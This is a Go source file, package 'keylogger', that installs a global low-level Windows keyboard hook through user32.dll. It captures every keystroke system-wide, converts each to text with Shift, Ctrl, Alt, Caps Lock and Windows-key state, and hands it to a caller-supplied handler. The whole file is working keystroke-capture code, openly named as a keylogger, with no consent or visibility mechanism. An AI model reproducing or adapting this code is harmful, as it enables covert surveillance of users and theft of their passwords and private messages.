package keylogger

import (
	"syscall"
	"unsafe"
)

var (
	user32              = syscall.NewLazyDLL("user32.dll")
	setWindowsHookEx    = user32.NewProc("SetWindowsHookExW")
	callNextHookEx      = user32.NewProc("CallNextHookEx")
	unhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	getMessage          = user32.NewProc("GetMessageW")
	translateMessage    = user32.NewProc("TranslateMessage")
	dispatchMessage     = user32.NewProc("DispatchMessageW")
	getKeyboardState    = user32.NewProc("GetKeyboardState")
	toAsciiEx           = user32.NewProc("ToAsciiEx")
	getKeyboardLayout   = user32.NewProc("GetKeyboardLayout")
)

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 256
	WM_KEYUP       = 257
	VK_SHIFT       = 16
	VK_CONTROL     = 17
	VK_MENU        = 18
	VK_CAPITAL     = 20
	VK_LSHIFT      = 160
	VK_RSHIFT      = 161
	VK_LCONTROL    = 162
	VK_RCONTROL    = 163
	VK_LMENU       = 164
	VK_RMENU       = 165
	VK_LWIN        = 91
	VK_RWIN        = 92
)

type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

type KeyEvent struct {
	Key       string
	VkCode    uint32
	ScanCode  uint32
	IsShift   bool
	IsCtrl    bool
	IsAlt     bool
	IsCaps    bool
	IsWin     bool
	IsSpecial bool
}

type KeyLogger struct {
	hook         uintptr
	stopChan     chan struct{}
	keyChan      chan KeyEvent
	handler      func(KeyEvent)
	capsLock     bool
	shiftPressed bool
	ctrlPressed  bool
	altPressed   bool
}

func NewKeyLogger(handler func(KeyEvent)) *KeyLogger {
	return &KeyLogger{
		stopChan: make(chan struct{}),
		keyChan:  make(chan KeyEvent, 100),
		handler:  handler,
	}
}

func (kl *KeyLogger) Start() error {
	hookProc := syscall.NewCallback(func(code int, wParam uintptr, lParam uintptr) uintptr {
		if code >= 0 {
			kb := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))

			if wParam == WM_KEYDOWN {
				switch kb.VkCode {
				case VK_LSHIFT, VK_RSHIFT:
					kl.shiftPressed = true
					return kl.callNextHook(0, code, wParam, lParam)
				case VK_LCONTROL, VK_RCONTROL:
					kl.ctrlPressed = true
					return kl.callNextHook(0, code, wParam, lParam)
				case VK_LMENU, VK_RMENU:
					kl.altPressed = true
					return kl.callNextHook(0, code, wParam, lParam)
				case VK_CAPITAL:
					kl.capsLock = !kl.capsLock
					return kl.callNextHook(0, code, wParam, lParam)
				case VK_LWIN, VK_RWIN:
					kl.sendKeyEvent(KeyEvent{
						Key:       "[WIN]",
						VkCode:    kb.VkCode,
						ScanCode:  kb.ScanCode,
						IsShift:   kl.shiftPressed,
						IsCtrl:    kl.ctrlPressed,
						IsAlt:     kl.altPressed,
						IsCaps:    kl.capsLock,
						IsWin:     true,
						IsSpecial: true,
					})
					return kl.callNextHook(0, code, wParam, lParam)
				default:
					keyStr := kl.getKeyString(kb.VkCode, kb.ScanCode)
					kl.sendKeyEvent(KeyEvent{
						Key:       keyStr,
						VkCode:    kb.VkCode,
						ScanCode:  kb.ScanCode,
						IsShift:   kl.shiftPressed,
						IsCtrl:    kl.ctrlPressed,
						IsAlt:     kl.altPressed,
						IsCaps:    kl.capsLock,
						IsWin:     false,
						IsSpecial: len(keyStr) > 1 || keyStr[0] == '[',
					})
				}
			} else if wParam == WM_KEYUP {
				switch kb.VkCode {
				case VK_LSHIFT, VK_RSHIFT:
					kl.shiftPressed = false
				case VK_LCONTROL, VK_RCONTROL:
					kl.ctrlPressed = false
				case VK_LMENU, VK_RMENU:
					kl.altPressed = false
				}
			}
		}
		return kl.callNextHook(0, code, wParam, lParam)
	})

	ret, _, _ := setWindowsHookEx.Call(WH_KEYBOARD_LL, hookProc, 0, 0)
	kl.hook = ret

	go kl.messageLoop()
	go kl.processKeys()

	return nil
}

func (kl *KeyLogger) getKeyString(vkCode, scanCode uint32) string {
	var keyState [256]byte
	getKeyboardState.Call(uintptr(unsafe.Pointer(&keyState[0])))

	if kl.capsLock {
		keyState[VK_CAPITAL] = 0x01
	}
	if kl.shiftPressed {
		keyState[VK_SHIFT] = 0x80
	}
	if kl.ctrlPressed {
		keyState[VK_CONTROL] = 0x80
	}
	if kl.altPressed {
		keyState[VK_MENU] = 0x80
	}

	layout, _, _ := getKeyboardLayout.Call(0)

	var buf [2]byte
	ret, _, _ := toAsciiEx.Call(
		uintptr(vkCode),
		uintptr(scanCode),
		uintptr(unsafe.Pointer(&keyState[0])),
		uintptr(unsafe.Pointer(&buf[0])),
		0,
		layout,
	)

	if ret == 1 && buf[0] != 0 {
		return string(buf[0])
	}

	switch vkCode {
	case 8:
		return "[BACKSPACE]"
	case 9:
		return "[TAB]"
	case 13:
		return "[ENTER]"
	case 27:
		return "[ESC]"
	case 32:
		return " "
	case 33:
		return "[PGUP]"
	case 34:
		return "[PGDN]"
	case 35:
		return "[END]"
	case 36:
		return "[HOME]"
	case 37:
		return "[LEFT]"
	case 38:
		return "[UP]"
	case 39:
		return "[RIGHT]"
	case 40:
		return "[DOWN]"
	case 45:
		return "[INS]"
	case 46:
		return "[DEL]"
	case 112:
		return "[F1]"
	case 113:
		return "[F2]"
	case 114:
		return "[F3]"
	case 115:
		return "[F4]"
	case 116:
		return "[F5]"
	case 117:
		return "[F6]"
	case 118:
		return "[F7]"
	case 119:
		return "[F8]"
	case 120:
		return "[F9]"
	case 121:
		return "[F10]"
	case 122:
		return "[F11]"
	case 123:
		return "[F12]"
	default:
		return string(rune(vkCode))
	}
}

func (kl *KeyLogger) sendKeyEvent(event KeyEvent) {
	select {
	case kl.keyChan <- event:
	default:
	}
}

func (kl *KeyLogger) processKeys() {
	for {
		select {
		case <-kl.stopChan:
			return
		case event := <-kl.keyChan:
			if kl.handler != nil {
				kl.handler(event)
			}
		}
	}
}

func (kl *KeyLogger) messageLoop() {
	var msg struct {
		HWnd   uintptr
		Msg    uint32
		WParam uintptr
		LParam uintptr
		Time   uint32
		Pt     struct{ X, Y int32 }
	}

	for {
		select {
		case <-kl.stopChan:
			return
		default:
			ret, _, _ := getMessage.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
			if ret == 0 {
				return
			}
			translateMessage.Call(uintptr(unsafe.Pointer(&msg)))
			dispatchMessage.Call(uintptr(unsafe.Pointer(&msg)))
		}
	}
}

func (kl *KeyLogger) callNextHook(hhook uintptr, nCode int, wParam uintptr, lParam uintptr) uintptr {
	ret, _, _ := callNextHookEx.Call(hhook, uintptr(nCode), wParam, lParam)
	return ret
}

func (kl *KeyLogger) Stop() {
	close(kl.stopChan)
	if kl.hook != 0 {
		unhookWindowsHookEx.Call(kl.hook)
		kl.hook = 0
	}
}

func (kl *KeyLogger) GetKeyChannel() <-chan KeyEvent {
	return kl.keyChan
}
